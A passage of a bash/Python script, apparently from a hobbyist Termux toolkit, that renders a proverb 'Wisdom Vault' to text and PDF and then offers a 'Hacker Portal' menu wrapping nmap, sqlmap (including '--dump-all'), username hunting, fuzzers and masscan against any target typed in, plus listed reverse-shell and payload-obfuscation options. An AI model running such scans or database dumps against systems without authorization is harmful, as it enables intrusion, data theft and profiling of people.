        ("Can't put the toothpaste back in the tube", "Some things, once said or done, cannot be undone."),
        ("You can't unring a bell", "Same energy. Words land. Actions land. They stay landed."),
        ("The road to hell is paved with good intentions", "Good intent doesn't prevent bad outcomes."),
        ("Ignorance is bliss",      "Not knowing protects you. Knowledge has weight. Choose wisely."),
        ("Truth hurts",             "The honest thing is usually the one that stings the most."),
    ]),
    ("STRATEGY & PATIENCE", [
        ("Strategy over impulse",   "The move that feels right now is rarely the move that wins long term."),
        ("Slow is smooth smooth is fast", "Rushing creates errors. Errors cost time. Slow wins."),
        ("Pick your battles",       "Not every fight deserves your energy. Some are traps dressed as opportunities."),
        ("Let sleeping dogs lie",   "Some things are better left undisturbed. You know which ones."),
        ("Don't count your chickens before they hatch", "It isn't done until it's done. Stay humble."),
        ("Measure twice cut once",  "Preparation prevents the expensive mistake."),
        ("The squeaky wheel gets the grease", "Make noise when it matters. Silence gets nothing."),
        ("Timing is everything",    "The right move at the wrong time is still the wrong move."),
        ("Play the long game",      "Short term losses mean nothing if the long term position is strong."),
        ("Rope-a-dope",             "Let them exhaust themselves. Then move."),
    ]),
    ("PEOPLE & RELATIONSHIPS", [
        ("Actions speak louder than words", "Watch what people do. Not what they say they'll do."),
        ("Show your true colours",  "Pressure reveals character. Wait for pressure."),
        ("Fair weather friend",     "Present when things are good. Gone when you actually need them."),
        ("Burn bridges",            "Cut a connection so completely there is no going back."),
        ("Keep your friends close enemies closer", "You need to understand the threat more than the comfort."),
        ("Birds of a feather flock together", "People cluster with their own kind eventually."),
        ("You can't judge a book by its cover", "Appearances are designed to mislead. Go deeper."),
        ("Leopard can't change its spots", "Core nature doesn't change. Character reveals itself over time."),
        ("Throw someone under the bus", "Sacrifice someone else to save yourself."),
        ("Once bitten twice shy",   "Pain teaches. You won't make that same mistake again."),
    ]),
    ("SOI / 999 ORIGINALS — FEZZY WISDOM", [
        ("Strategy Over Impulse",   "The whole philosophy. The impulse is loud. Strategy is quiet. Quiet wins."),
        ("999",                     "Flip the negative. 666 upside down. Turn struggle into something positive."),
        ("Legend never dies",       "The work outlasts the person. Build something that lasts."),
        ("The signal stays alive",  "Even when everything goes quiet — the frequency is still there. Tune in."),
        ("Intoxicated Fezzy ships", "The chaotic creative state gets things done that Admin Fezzy overplans."),
        ("Admin Fezzy finishes",    "Discipline closes what inspiration opened. Both personas are necessary."),
        ("Bojack knows",            "Sometimes the darkest voice in the room is the only honest one."),
        ("The vault is open",       "You built something real. The work is the proof. Open the vault."),
        ("Ravensmead to the world", "Where you start doesn't define where the signal reaches."),
        ("Turn the static into signal", "Chaos is just unorganised energy. Organise it. That's the whole move."),
    ]),
]

lines = []
lines.append("=" * 70)
lines.append("  SOI WISDOM VAULT  ·  FEZZY STATION V59  ·  STRATEGY OVER IMPULSE")
lines.append(f"  Generated: {datetime.datetime.now().strftime('%d %B %Y  %H:%M')}")
lines.append(f"  philfesters  ·  Ravensmead  ·  Cape Town  ·  999")
lines.append("=" * 70)
lines.append("")

for section_title, entries in SECTIONS:
    lines.append("")
    lines.append("─" * 70)
    lines.append(f"  {section_title}")
    lines.append("─" * 70)
    for term, meaning in entries:
        lines.append(f"")
        lines.append(f"  {term}")
        # Word wrap meaning at 64 chars
        words = meaning.split()
        line = "    "
        for w in words:
            if len(line) + len(w) + 1 > 68:
                lines.append(line)
                line = "    " + w
            else:
                line = line + (" " if line != "    " else "") + w
        lines.append(line)

lines.append("")
lines.append("=" * 70)
lines.append("  Built with Claude · Anthropic · Strategy Over Impulse · 999")
lines.append("=" * 70)
lines.append("")

with open(OUT, 'w') as f:
    f.write('\n'.join(lines))

print(f"  SAVED: {OUT}")
print(f"  Entries: {sum(len(e) for _,e in SECTIONS)}")

# Try PDF
try:
    from reportlab.lib.pagesizes import A4
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.colors import HexColor
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, HRFlowable
    from reportlab.lib.units import mm
    from reportlab.lib.enums import TA_LEFT, TA_CENTER

    OPDF = os.path.expanduser("~/storage/downloads/books/SOI_WISDOM_VAULT.pdf")
    BG   = HexColor("#0a0a0f"); CYAN = HexColor("#00f5ff"); PINK = HexColor("#ff3ea5")
    FADE = HexColor("#444466"); WHITE= HexColor("#e8e8f0"); GREEN= HexColor("#00ff88")

    def PS(n,**kw): return ParagraphStyle(n,**kw)
    TIT = PS("T",  fontSize=18, textColor=CYAN,  fontName="Helvetica-Bold", spaceAfter=2)
    SUB = PS("S",  fontSize=10, textColor=PINK,  fontName="Helvetica-Bold", spaceAfter=3, spaceBefore=10)
    TRM = PS("TM", fontSize=9,  textColor=CYAN,  fontName="Helvetica-Bold", spaceAfter=1)
    DEF = PS("D",  fontSize=8,  textColor=WHITE, fontName="Helvetica", leading=13, spaceAfter=4)
    FDT = PS("FD", fontSize=7,  textColor=FADE,  fontName="Helvetica", alignment=TA_CENTER)

    doc = SimpleDocTemplate(OPDF, pagesize=A4,
        leftMargin=18*mm, rightMargin=18*mm, topMargin=14*mm, bottomMargin=14*mm,
        title="SOI Wisdom Vault — Fezzy Station V59")
    story = []
    story.append(Paragraph("SOI WISDOM VAULT", TIT))
    story.append(Paragraph("Fezzy Station V59  ·  Strategy Over Impulse  ·  999  ·  philfesters", FDT))
    story.append(HRFlowable(width="100%", thickness=0.4, color=FADE, spaceAfter=6))

    for section_title, entries in SECTIONS:
        story.append(Paragraph(section_title, SUB))
        story.append(HRFlowable(width="100%", thickness=0.3, color=FADE, spaceAfter=4))
        for term, meaning in entries:
            story.append(Paragraph(term, TRM))
            story.append(Paragraph(meaning, DEF))

    story.append(HRFlowable(width="100%", thickness=0.4, color=FADE, spaceAfter=4))
    story.append(Paragraph("Built with Claude · Anthropic · Strategy Over Impulse · 999", FDT))
    doc.build(story)
    print(f"  PDF:   {OPDF}")
except Exception as e:
    print(f"  PDF skipped (reportlab not on device): {e}")
WISDOM_PY
                local _wv_exit=$?
                echo ""
                if [[ -f "$_wvout" ]]; then
                    _dv
                    printf "  ${C10}${BOLD}VAULT GENERATED${RESET}\n"
                    _dv; echo ""
                    printf "  ${GRN}✓ TXT  → %s${RESET}\n" "$_wvout"
                    local _wvpdf="${_wvout%.txt}.pdf"
                    [[ -f "$_wvpdf" ]] && printf "  ${GRN}✓ PDF  → %s${RESET}\n" "$_wvpdf"
                    echo ""
                    printf "  ${C10}[V]${RESET} View in terminal  ${C10}[O]${RESET} Open in Android  ${FADE}[ENTER] skip${RESET}\n"
                    printf "  ${C10}» ${RESET}"; read -r _wv_ch
                    case "${_wv_ch^^}" in
                        V) less "$_wvout" ;;
                        O)
                            if [[ -f "$_wvpdf" ]]; then
                                termux-open "$_wvpdf" 2>/dev/null \
                                    || termux-open "$_wvout" 2>/dev/null \
                                    || printf "  ${YEL}termux-open not available${RESET}\n"
                            else
                                termux-open "$_wvout" 2>/dev/null \
                                    || printf "  ${YEL}termux-open not available${RESET}\n"
                            fi ;;
                    esac
                else
                    printf "  ${RED}Generation failed${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [11] HACKER PORTAL  —  V53 EXPANDED
# ═══════════════════════════════════════════════════════════════════

hacker_portal() {
    while true; do
        clear
        _portal_entry "Hacker Portal" "${C11}"
        echo ""
        _dv11
        printf "  ${C11}${BOLD}HACKER PORTAL  —  OSINT · Web · Network · Password · Tools${RESET}\n"
        _dv11
        echo ""
        printf "  ${WH}nmap · sherlock · sqlmap · nikto · gobuster · hydra · john · WebSift · Surface Watchdog${RESET}\n"
        printf "  ${FADE}■ Rootless phone · no jail · still running nmap · they called it WiFi we call it recon · 999${RESET}\n"
        echo ""
        _dv11
        echo ""
        printf "  ${C11}${BOLD}── OSINT & RECON ──────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[1]  nmap          — port scan, OS detect, service fingerprint       ${RESET}\n"
        printf "  ${WH}[2]  sherlock      — username hunt across 300+ platforms             ${RESET}\n"
        printf "  ${WH}[3]  whois         — domain ownership and registration lookup        ${RESET}\n"
        printf "  ${WH}[4]  theHarvester  — emails, subdomains, hosts from public sources   ${RESET}\n"
        printf "  ${WH}[5]  holehe        — email registered on 120+ sites                  ${RESET}\n"
        printf "  ${WH}[6]  Shodan-CLI    — search internet-facing hosts, IPs, banners      ${RESET}\n"
        printf "  ${WH}[7]  subfinder     — passive subdomain enum, very fast               ${RESET}\n"
        printf "  ${WH}[8]  Amass         — deep DNS recon + ASN + org mapping              ${RESET}\n"
        printf "  ${WH}[9]  recon-ng      — modular web recon framework                     ${RESET}\n"
        printf "  ${WH}[10] Photon        — OSINT spider: links, emails, keys from URL      ${RESET}\n"
        printf "  ${WH}[11] anubis        — subdomain enum and DNS brute-force              ${RESET}\n"
        printf "  ${WH}[12] Automated Recon — whois + nmap + subdomain all-in-one          ${RESET}\n"
        printf "  ${WH}[13] DNSdumpster   — DNS recon via curl to dnsdumpster.com           ${RESET}\n"
        printf "  ${WH}[14] exiftool      — extract metadata from any file                  ${RESET}\n"
        echo ""
        printf "  ${C11}${BOLD}── WEB APPLICATION ────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[15] sqlmap    — SQL injection scanner and exploiter                 ${RESET}\n"
        printf "  ${WH}[16] wfuzz     — web directory, param and vhost fuzzer               ${RESET}\n"
        printf "  ${WH}[17] nikto     — web server vulnerability scanner                    ${RESET}\n"
        printf "  ${WH}[18] gobuster  — directory, DNS and vhost brute-forcer               ${RESET}\n"
        printf "  ${WH}[19] ffuf      — fast web fuzzer (dirs, params, subdomains)          ${RESET}\n"
        printf "  ${WH}[20] whatweb   — identify CMS, frameworks, headers, versions         ${RESET}\n"
        printf "  ${WH}[21] wafw00f   — detect Web Application Firewalls                    ${RESET}\n"
        echo ""
        printf "  ${C11}${BOLD}── NETWORK TOOLS ──────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[22] masscan   — fastest port scanner, entire range in seconds       ${RESET}\n"
        printf "  ${WH}[23] netcat    — TCP/UDP swiss army knife, banner grab, chat         ${RESET}\n"
        printf "  ${WH}[24] dnsx      — DNS resolver, bulk domain check, takeover detect    ${RESET}\n"
        printf "  ${WH}[25] httpx     — HTTP prober, status codes, tech fingerprint         ${RESET}\n"
        printf "  ${WH}[26] mtr       — live traceroute + ping network path                 ${RESET}\n"
        printf "  ${WH}[27] dig       — DNS deep dive, record types, DNSSEC                 ${RESET}\n"
        echo ""
        printf "  ${C11}${BOLD}── PASSWORD & HASH ────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[28] hydra     — network login brute-forcer, 50+ protocols           ${RESET}\n"
        printf "  ${WH}[29] john      — John the Ripper — hash cracker                      ${RESET}\n"
        printf "  ${WH}[30] hashcat   — GPU/CPU hash cracking (CPU mode on Android)         ${RESET}\n"
        printf "  ${WH}[31] hashid    — identify unknown hash types                         ${RESET}\n"
        printf "  ${WH}[32] crunch    — custom wordlist generator                           ${RESET}\n"
        printf "  ${WH}[33] wordlist  — preview rockyou.txt or any wordlist                 ${RESET}\n"
        echo ""
        printf "  ${C11}${BOLD}── MISC TOOLS ─────────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[34] WebSift         — OSINT: scrape emails, phones, links from URL  ${RESET}\n"
        printf "  ${WH}[35] Surface Watchdog — one-shot OSINT report on a domain            ${RESET}\n"
        printf "  ${WH}[36] Custom command  — drop into any raw command direct               ${RESET}\n"
        echo ""
        printf "  ${C11}${BOLD}── ADVANCED ARSENAL ───────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[37] CVE Search      — exploit database lookup, CVE details + PoC     ${RESET}\n"
        printf "  ${WH}[38] Reverse Shell   — generate shells (bash, python, php, nc)        ${RESET}\n"
        printf "  ${WH}[39] Payload Encoder — encode/obfuscate payloads (base64, url, hex)  ${RESET}\n"
        printf "  ${WH}[40] XSS Scanner     — test XSS vectors on URL parameters             ${RESET}\n"
        printf "  ${WH}[41] SSL/TLS Audit   — test cipher suites, certificate validation    ${RESET}\n"
        printf "  ${WH}[42] Subdomain Takeover — check dangling DNS, GitHub pages, AWS     ${RESET}\n"
        printf "  ${WH}[43] GitHub Dorking  — search GitHub repos for secrets, keys, API    ${RESET}\n"
        printf "  ${WH}[44] Pastebin Leak   — search pastebin/paste sites for leaks         ${RESET}\n"
        printf "  ${WH}[45] Port Knock      — send knock sequence to firewall ports         ${RESET}\n"
        printf "  ${WH}[46] DNS Zone Xfer   — test zone transfer vulnerability (AXFR)       ${RESET}\n"
        printf "  ${WH}[47] Live Sniffer    — packet capture with tcpdump (interface list)  ${RESET}\n"
        printf "  ${WH}[48] Auto-Recon      — full recon chain: whois+nmap+subdomain+scan   ${RESET}\n"
        echo ""
        printf "  ${C11}${BOLD}── INSTALL ────────────────────────────────────────────────────────${RESET}\n"
        printf "  ${C11}[A] Install OSINT tools    [B] Install Web App tools                ${RESET}\n"
        printf "  ${C11}[C] Install Network tools  [D] Install Password tools               ${RESET}\n"
        printf "  ${C11}[E] Install WebSift        [F] Install Surface Watchdog             ${RESET}\n"
        printf "  ${C11}[Z] Install ALL hacker packages                                     ${RESET}\n"
        echo ""
        printf "  ${C11}[T] Drop to shell       — exit to Termux \$ for manual installs      ${RESET}\n"
        printf "  ${FADE}💡 Did you know? You can save install commands in Note Editor [13] for quick copy-paste${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv11
        echo ""
        _hover_hint "hacker"
        echo ""
        printf "  ${C11}${BOLD}Choice » ${RESET}"
        read -r ch

        case "$ch" in
            # ── OSINT & RECON ──────────────────────────────────────────────
            1)
                echo ""; printf "  ${WH}Target IP or hostname: ${RESET}"; read -r target
                [[ -z "$target" ]] && continue
                echo ""
                printf "  ${C11}[*] nmap scan on %s...${RESET}\n\n" "$target"
                printf "  ${WH}[1] Quick (-sV)  [2] Full (-sV -sC -A)  [3] All ports (-p-)  [4] UDP (-sU top 100): ${RESET}"; read -r nm
                mkdir -p "$HACKDIR"
                local nout="$HACKDIR/nmap_${target}_$(date +%Y%m%d_%H%M%S).txt"
                case "$nm" in
                    1) nmap -sV "$target" | tee "$nout" ;;
                    2) nmap -sV -sC -A "$target" | tee "$nout" ;;
                    3) nmap -p- "$target" | tee "$nout" ;;
                    4) nmap -sU --top-ports 100 "$target" | tee "$nout" ;;
                    *) nmap -sV "$target" | tee "$nout" ;;
                esac
                printf "\n  ${GRN}✓ Saved → %s${RESET}\n" "$nout"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""; printf "  ${WH}Username to hunt: ${RESET}"; read -r username
                [[ -z "$username" ]] && continue
                echo ""
                if command -v sherlock &>/dev/null; then
                    mkdir -p "$HACKDIR"
                    printf "  ${C11}[*] sherlock hunt for %s...${RESET}\n\n" "$username"
                    sherlock "$username" --output "$HACKDIR/sherlock_${username}.txt"
                    printf "\n  ${GRN}✓ Results → %s/sherlock_%s.txt${RESET}\n" "$HACKDIR" "$username"
                else
                    printf "  ${RED}sherlock not installed${RESET}\n"
                    printf "  ${WH}Install: pip install sherlock-project --break-system-packages${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""; printf "  ${WH}Domain: ${RESET}"; read -r domain
                [[ -z "$domain" ]] && continue
                echo ""
                printf "  ${C11}[*] whois lookup for %s...${RESET}\n\n" "$domain"
                whois "$domain"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""; printf "  ${WH}Domain: ${RESET}"; read -r domain
                [[ -z "$domain" ]] && continue
                echo ""
                if command -v theHarvester &>/dev/null; then
                    mkdir -p "$HACKDIR"
                    printf "  ${C11}[*] theHarvester recon on %s...${RESET}\n\n" "$domain"
                    local thout="$HACKDIR/harvester_${domain}_$(date +%Y%m%d_%H%M%S).txt"
                    theHarvester -d "$domain" -b all | tee "$thout"
                    printf "\n  ${GRN}✓ Saved → %s${RESET}\n" "$thout"
                else
                    printf "  ${RED}theHarvester not installed${RESET}\n"
                    printf "  ${WH}Install: pip install theHarvester --break-system-packages${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""; printf "  ${WH}Email: ${RESET}"; read -r email
                [[ -z "$email" ]] && continue
                echo ""
                if command -v holehe &>/dev/null; then
                    printf "  ${C11}[*] holehe check for %s...${RESET}\n\n" "$email"
                    holehe "$email"
                else
                    printf "  ${RED}holehe not installed${RESET}\n"
                    printf "  ${WH}Install: pip install holehe --break-system-packages${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""
                printf "  ${C11}Shodan-CLI:${RESET}\n\n"
                if command -v shodan &>/dev/null; then
                    printf "  ${WH}[1] Search  [2] Host lookup  [3] My IP  [4] Stats  [5] Count: ${RESET}"; read -r smode
                    echo ""
                    case "$smode" in
                        1) printf "  ${WH}Query (e.g. apache port:80): ${RESET}"; read -r q; [[ -z "$q" ]] && continue; shodan search "$q" ;;
                        2) printf "  ${WH}IP address: ${RESET}"; read -r ip; [[ -z "$ip" ]] && continue; shodan host "$ip" ;;
                        3) shodan myip ;;
                        4) printf "  ${WH}Query for stats: ${RESET}"; read -r q; [[ -z "$q" ]] && continue; shodan stats "$q" ;;
                        5) printf "  ${WH}Query to count: ${RESET}"; read -r q; [[ -z "$q" ]] && continue; shodan count "$q" ;;
                        *) printf "  ${RED}Invalid${RESET}\n" ;;
                    esac
                else
                    printf "  ${RED}shodan not installed${RESET}\n"
                    printf "  ${WH}Install: pip install shodan --break-system-packages${RESET}\n"
                    printf "  ${WH}Then: shodan init YOUR_API_KEY  (free key at shodan.io)${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""; printf "  ${WH}Target domain: ${RESET}"; read -r domain
                [[ -z "$domain" ]] && continue
                echo ""
                if command -v subfinder &>/dev/null; then
                    mkdir -p "$HACKDIR"
                    printf "  ${C11}[*] subfinder passive enum for %s...${RESET}\n\n" "$domain"
                    local sfout="$HACKDIR/subfinder_${domain}_$(date +%Y%m%d_%H%M%S).txt"
                    subfinder -d "$domain" -o "$sfout"
                    local cnt; cnt=$(wc -l < "$sfout" 2>/dev/null || echo 0)
                    printf "\n  ${GRN}✓ Found %s subdomains → %s${RESET}\n" "$cnt" "$sfout"
                else
                    printf "  ${RED}subfinder not installed${RESET}\n"
                    printf "  ${WH}pkg install golang && go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""; printf "  ${WH}Target domain: ${RESET}"; read -r domain
                [[ -z "$domain" ]] && continue
                echo ""
                if command -v amass &>/dev/null; then
                    mkdir -p "$HACKDIR"
                    printf "  ${C11}[*] Amass enum for %s...${RESET}\n\n" "$domain"
                    local amout="$HACKDIR/amass_${domain}_$(date +%Y%m%d_%H%M%S).txt"
                    amass enum -passive -d "$domain" -o "$amout"
                    local cnt; cnt=$(wc -l < "$amout" 2>/dev/null || echo 0)
                    printf "\n  ${GRN}✓ Found %s results → %s${RESET}\n" "$cnt" "$amout"
                else
                    printf "  ${RED}Amass not installed — pkg install amass${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                echo ""
                if command -v recon-ng &>/dev/null; then
                    printf "  ${C11}[*] Launching recon-ng...${RESET}\n\n"
                    recon-ng
                else
                    printf "  ${RED}recon-ng not installed${RESET}\n"
                    printf "  ${WH}Install: pip install recon-ng --break-system-packages${RESET}\n"
                    printf "  ${WH}Or: git clone https://github.com/lanmaster53/recon-ng.git ~/recon-ng${RESET}\n"
                    printf "  ${WH}    cd ~/recon-ng && pip install -r REQUIREMENTS --break-system-packages${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10)
                echo ""; printf "  ${WH}Target URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                if [[ -f ~/Photon/photon.py ]]; then
                    mkdir -p "$HACKDIR"
                    printf "  ${C11}[*] Photon OSINT spider on %s...${RESET}\n\n" "$url"
                    python3 ~/Photon/photon.py -u "$url" -o "$HACKDIR/photon_$(date +%Y%m%d_%H%M%S)"
                    printf "\n  ${GRN}✓ Results saved to %s${RESET}\n" "$HACKDIR"
                else
                    printf "  ${RED}Photon not cloned${RESET}\n"
                    printf "  ${WH}Install: git clone https://github.com/s0md3v/Photon.git ~/Photon${RESET}\n"
                    printf "  ${WH}    pip install -r ~/Photon/requirements.txt --break-system-packages${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            11)
                echo ""; printf "  ${WH}Domain: ${RESET}"; read -r domain
                [[ -z "$domain" ]] && continue
                echo ""
                if command -v anubis &>/dev/null; then
                    printf "  ${C11}[*] anubis subdomain enum for %s...${RESET}\n\n" "$domain"
                    anubis -t "$domain"
                else
                    printf "  ${RED}anubis not installed${RESET}\n"
                    printf "  ${WH}Install: pip install anubis-netsec --break-system-packages${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            12)
                echo ""; printf "  ${WH}Target domain: ${RESET}"; read -r target
                [[ -z "$target" ]] && continue
                mkdir -p "$HACKDIR"
                local arout="$HACKDIR/auto_recon_${target}_$(date +%Y%m%d_%H%M%S).txt"
                echo ""
                printf "  ${C11}[*] Automated Recon on %s — output: %s${RESET}\n\n" "$target" "$arout"
                printf "  ${YEL}[1/4] whois...${RESET}\n\n"
                whois "$target" | tee -a "$arout"
                echo ""
                printf "  ${YEL}[2/4] nmap -sV...${RESET}\n\n"
                nmap -sV "$target" | tee -a "$arout"
                echo ""
                printf "  ${YEL}[3/4] DNS records...${RESET}\n\n"
                dig ANY "$target" 2>/dev/null | tee -a "$arout" || nslookup "$target" | tee -a "$arout"
                echo ""
                printf "  ${YEL}[4/4] HTTP headers...${RESET}\n\n"
                curl -sI "https://$target" 2>/dev/null | tee -a "$arout" || curl -sI "http://$target" 2>/dev/null | tee -a "$arout"
                echo ""
                printf "  ${GRN}✓ Automated recon complete → %s${RESET}\n" "$arout"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            13)
                echo ""; printf "  ${WH}Domain: ${RESET}"; read -r domain
                [[ -z "$domain" ]] && continue
                echo ""
                printf "  ${C11}[*] DNS records for %s via curl...${RESET}\n\n" "$domain"
                printf "  ${WH}A records:${RESET}\n"; dig +short A "$domain" 2>/dev/null || nslookup "$domain"
                printf "\n  ${WH}MX records:${RESET}\n"; dig +short MX "$domain" 2>/dev/null
                printf "\n  ${WH}TXT records:${RESET}\n"; dig +short TXT "$domain" 2>/dev/null
                printf "\n  ${WH}NS records:${RESET}\n"; dig +short NS "$domain" 2>/dev/null
                printf "\n  ${WH}CNAME:${RESET}\n"; dig +short CNAME "$domain" 2>/dev/null
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            14)
                echo ""; printf "  ${WH}File path: ${RESET}"; read -r fpath
                fpath=$(_xpath "$fpath")
                [[ -z "$fpath" ]] && continue
                echo ""
                if command -v exiftool &>/dev/null; then
                    printf "  ${C11}[*] exiftool metadata for %s...${RESET}\n\n" "$(basename "$fpath")"
                    exiftool "$fpath"
                else
                    printf "  ${RED}exiftool not installed — pkg install libexif${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;

            # ── WEB APPLICATION ────────────────────────────────────────────
            15)
                echo ""; printf "  ${WH}Target URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                mkdir -p "$HACKDIR"
                echo ""
                printf "  ${WH}[1] Basic scan  [2] DBs  [3] Tables  [4] Dump all  [5] Level 5 risk 3: ${RESET}"; read -r sqm
                case "$sqm" in
                    1) sqlmap -u "$url" --batch | tee "$HACKDIR/sqlmap_$(date +%Y%m%d_%H%M%S).txt" ;;
                    2) sqlmap -u "$url" --batch --dbs | tee "$HACKDIR/sqlmap_$(date +%Y%m%d_%H%M%S).txt" ;;
                    3) printf "  ${WH}DB name: ${RESET}"; read -r db; sqlmap -u "$url" --batch -D "$db" --tables | tee "$HACKDIR/sqlmap_$(date +%Y%m%d_%H%M%S).txt" ;;
                    4) sqlmap -u "$url" --batch --dump-all | tee "$HACKDIR/sqlmap_$(date +%Y%m%d_%H%M%S).txt" ;;
                    5) sqlmap -u "$url" --batch --level 5 --risk 3 | tee "$HACKDIR/sqlmap_$(date +%Y%m%d_%H%M%S).txt" ;;
                    *) sqlmap -u "$url" --batch ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            16)
                echo ""; printf "  ${WH}Target URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""; printf "  ${WH}Wordlist (default common.txt): ${RESET}"; read -r wl
                [[ -z "$wl" ]] && wl="/usr/share/wordlists/dirb/common.txt"
                echo ""
                printf "  ${C11}[*] wfuzz scan...${RESET}\n\n"
                wfuzz -c -z file,"$wl" --hc 404 "$url/FUZZ"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            17)
                echo ""; printf "  ${WH}Target URL (e.g. http://target.com): ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                if command -v nikto &>/dev/null; then
                    mkdir -p "$HACKDIR"
                    local nkout="$HACKDIR/nikto_$(date +%Y%m%d_%H%M%S).txt"
                    printf "  ${C11}[*] nikto web scan on %s...${RESET}\n\n" "$url"
                    nikto -h "$url" | tee "$nkout"
                    printf "\n  ${GRN}✓ Saved → %s${RESET}\n" "$nkout"
                else
                    printf "  ${RED}nikto not installed${RESET}\n"
                    printf "  ${WH}Install: pkg install nikto${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            18)
                echo ""; printf "  ${WH}Target URL or domain: ${RESET}"; read -r target
                [[ -z "$target" ]] && continue
                echo ""; printf "  ${WH}Wordlist (default: /usr/share/wordlists/dirb/common.txt): ${RESET}"; read -r wl
                [[ -z "$wl" ]] && wl="/usr/share/wordlists/dirb/common.txt"
                echo ""; printf "  ${WH}Mode [1] dir  [2] dns  [3] vhost: ${RESET}"; read -r gbm
                echo ""
                if command -v gobuster &>/dev/null; then
                    mkdir -p "$HACKDIR"
                    local gbout="$HACKDIR/gobuster_$(date +%Y%m%d_%H%M%S).txt"
                    case "$gbm" in
                        1) gobuster dir -u "$target" -w "$wl" -o "$gbout" ;;
                        2) gobuster dns -d "$target" -w "$wl" -o "$gbout" ;;
                        3) gobuster vhost -u "$target" -w "$wl" -o "$gbout" ;;
                        *) gobuster dir -u "$target" -w "$wl" -o "$gbout" ;;
                    esac
                    printf "\n  ${GRN}✓ Saved → %s${RESET}\n" "$gbout"
                else
                    printf "  ${RED}gobuster not installed${RESET}\n"
                    printf "  ${WH}Install: pkg install golang && go install github.com/OJ/gobuster/v3@latest${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            19)
                echo ""; printf "  ${WH}Target URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""; printf "  ${WH}Wordlist: ${RESET}"; read -r wl
                [[ -z "$wl" ]] && wl="/usr/share/wordlists/dirb/common.txt"
                echo ""
                if command -v ffuf &>/dev/null; then
                    mkdir -p "$HACKDIR"
                    printf "  ${C11}[*] ffuf fuzzing %s...${RESET}\n\n" "$url"
                    ffuf -u "${url}/FUZZ" -w "$wl" -o "$HACKDIR/ffuf_$(date +%Y%m%d_%H%M%S).json"
                else
                    printf "  ${RED}ffuf not installed${RESET}\n"
                    printf "  ${WH}Install: pkg install golang && go install github.com/ffuf/ffuf@latest${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            20)
                echo ""; printf "  ${WH}Target URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                if command -v whatweb &>/dev/null; then
                    printf "  ${C11}[*] whatweb fingerprint: %s${RESET}\n\n" "$url"
                    whatweb -a 3 "$url"
                else
                    printf "  ${RED}whatweb not installed${RESET}\n"
                    printf "  ${WH}Install: pkg install ruby && gem install whatweb${RESET}\n"
                    printf "  ${WH}Or: git clone https://github.com/urbanadventurer/WhatWeb.git ~/WhatWeb${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            21)
                echo ""; printf "  ${WH}Target URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                if command -v wafw00f &>/dev/null; then
                    printf "  ${C11}[*] WAF detection on %s...${RESET}\n\n" "$url"
                    wafw00f "$url"
                else
                    printf "  ${RED}wafw00f not installed${RESET}\n"
                    printf "  ${WH}Install: pip install wafw00f --break-system-packages${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;

            # ── NETWORK TOOLS ──────────────────────────────────────────────
            22)
                echo ""; printf "  ${WH}Target IP/range (e.g. 192.168.1.0/24): ${RESET}"; read -r target
                [[ -z "$target" ]] && continue
                echo ""; printf "  ${WH}Port range (e.g. 0-65535 or 80,443): ${RESET}"; read -r ports
                [[ -z "$ports" ]] && ports="0-65535"
                echo ""
                if command -v masscan &>/dev/null; then
                    mkdir -p "$HACKDIR"
